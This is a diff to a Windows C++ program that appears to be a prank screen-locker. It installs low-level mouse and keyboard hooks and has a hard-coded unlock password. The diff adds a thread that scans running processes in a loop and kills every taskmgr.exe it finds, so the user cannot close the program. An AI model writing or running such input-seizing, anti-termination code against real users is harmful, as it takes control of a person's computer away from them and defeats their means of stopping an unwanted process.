@@ -11,7 +11,9 @@
 
 #include <cstdlib>
 #include <ctime>
+#include <tchar.h>
 #include <Windows.h>
+#include <TlHelp32.h>
 //#include "RunOnce.h"
 #include "resource.h"
 
@@ -24,11 +26,13 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
 LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam);
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 DWORD WINAPI PaintProc(LPVOID lpParam);
+DWORD WINAPI TaskManagerProc(LPVOID lpParam);
 
 // Color to ignore when displaying window
 const COLORREF COLOR_KEY = RGB(255, 255, 255);
 const unsigned int NUM_FRAMES = 10;
 const DWORD TICKS_PER_FRAME = 75;
+
 CHAR g_szPassword[] = "MATTSUX";
 
 HWND g_hWnd = 0;
@@ -52,6 +56,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nCmdShow)
 	HHOOK hHookKbd = 0;
 	//DWORD dwTicksAtPaint = 0;
 	HANDLE hPThread = 0;
+	HANDLE hTMThread = 0;
 	POINT ptMousePos;
 	
 	srand(static_cast<unsigned int> (time(reinterpret_cast<time_t*> (NULL))));
@@ -130,6 +135,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nCmdShow)
 		NULL, 0, 0)) == NULL)
 		goto exit;
 
+	if ((hTMThread = CreateThread(NULL, 0, TaskManagerProc,
+		NULL, 0, 0)) == NULL)
+		goto exit;
+
 	if ((hHookMs = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, hInstance, 0)) == NULL)
 		goto exit;
 
@@ -188,6 +197,9 @@ exit:
 
 	if (hPThread)
 		CloseHandle(hPThread);
+
+	if (hTMThread)
+		CloseHandle(hTMThread);
 
 	if (hHookMs)
 		UnhookWindowsHookEx(hHookMs);
@@ -273,6 +285,67 @@ DWORD WINAPI PaintProc(LPVOID lpParam)
 
 		Sleep(1);
 	}
+
+	return 0;
+}
+
+// Task manager takes priority and gets messages before me, so let's kill it with fire--err, code.
+DWORD WINAPI TaskManagerProc(LPVOID lpParam)
+{
+	UNREFERENCED_PARAMETER(lpParam);
+
+	HANDLE snapshot = 0;
+	PROCESSENTRY32 pe32;
+	TCHAR *killProcs[] = {TEXT("taskmgr.exe")};
+	TCHAR *tStrCopy = 0;
+	HANDLE hProcess = 0;
+	DWORD exitCode = 0;
+
+	tStrCopy = new TCHAR[MAX_PATH];
+
+	while (!g_bDone)
+	{
+		snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+		SecureZeroMemory(&pe32, sizeof(pe32));
+		pe32.dwSize = sizeof(PROCESSENTRY32);
+		if (!Process32First(snapshot, &pe32))
+			return FALSE;
+
+		// Sweet n^2 of peace.
+		do
+		{
+			// Omg, for each in! Someday we'll use awesome sauce lambda closures too!
+			for each (TCHAR *szName in killProcs)
+			{
+				SecureZeroMemory(tStrCopy, MAX_PATH);
+				// Generates warning.
+				_tcscpy(tStrCopy, pe32.szExeFile);
+				for (TCHAR* tstr = tStrCopy; *tstr; ++tstr)
+					*tstr = tolower(static_cast<TCHAR> (*tstr));
+
+				if (!_tcscmp(szName, tStrCopy))
+				{
+					if ((hProcess = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID)) == NULL)
+						continue;
+
+					if (GetExitCodeProcess(hProcess, &exitCode) != 0)
+					{
+						TerminateProcess(hProcess, exitCode);
+					}
+
+					CloseHandle(hProcess);
+				}
+			}
+		} while (Process32Next(snapshot, &pe32));
+
+		CloseHandle(snapshot);
+
+		Sleep(1);
+	}
+
+	delete [] tStrCopy;
+	tStrCopy = 0;
 
 	return 0;
 }
